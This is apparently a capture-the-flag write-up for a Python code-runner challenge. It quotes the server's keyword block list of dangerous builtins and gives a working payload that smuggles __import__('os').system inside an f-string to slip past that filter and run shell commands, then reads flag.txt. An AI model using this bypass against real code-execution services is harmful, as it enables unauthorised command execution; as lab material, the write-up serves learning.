# Challenge:

Code đi bạn ơi ;)

FLAG Format: EHC{XXX}

# Solution:

After download and read the challenge file (The only file `run.py`), I understand that this website allow you to upload file and after upload complete, the server will auto execute the code:
```
if tested[0]:
        res = ''
        try:
            ps = subprocess.run(['python', fname], timeout=5,
                                capture_output=True, text=True)
            res = ps.stdout
        except:
            res = 'code timout'
        return render_template('submit.html', code=code_to_test.split('\n'), text=res.strip().split('\n'))
    else:
        return render_template('submit.html', code=code_to_test.split('\n'), text=[tested[1]])
```
But before the code can be executed, the server have filtering our code:
```
tested = test_code(code_to_test)  #Line 32

def test_for_invalid(code):
    if len(code) > 1000:
        return True
    try:
        parse(code)
    except:
        return True
    return False

blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec",
           "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys",
           "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]

blocked_regex = re.compile(fr'({"|".join(blocked)})(?![a-zA-Z0-9_])')


def test_for_disallowed(code):
    code = clean_comments_and_strings(code)
    return blocked_regex.search(code) is not None


def test_code(code):
    if test_for_non_ascii(code):
        return (False, 'found a non-ascii character')
    elif test_for_invalid(code):
        return (False, 'code too long or not parseable')
    elif test_for_imports(code):
        return (False, 'found an import')
    elif test_for_disallowed(code):
        return (False, 'found an invalid keyword')
    return (True, '')
```

See the filter we know that we only can upload code with ascii, under 1000 words and not contain the word in `blocked`. But the blocked list can block all things??

After testing some function, i realize that if the blocked word in s string, it not block any more. So a have an idea of using a very cool function of python. The `f-string`.

That idea lead me to this: `f'{__import__('os')}'. Which can import the mighty os function and i can do many things from now. Start this payload to see the current file:
```
print(f'{__import__("os").system("ls -la")}')
```
![1st](https://github.com/Katsumi1012/CTF/assets/90083485/e85e4b79-e915-4f1f-912e-10d60292246e)

Notthing seem interesting here so cd out side to see

![1st](https://github.com/Katsumi1012/CTF/assets/90083485/63d7b2e1-6308-42e4-8128-6a1d88a94aa0)

Oh we saw file call `flag.txt` lets get in there and see the flag 🚩

![1st](https://github.com/Katsumi1012/CTF/assets/90083485/e3cb7092-ee3d-4915-80bc-5f75cd4fe0d0)


# ENJOY 🤡

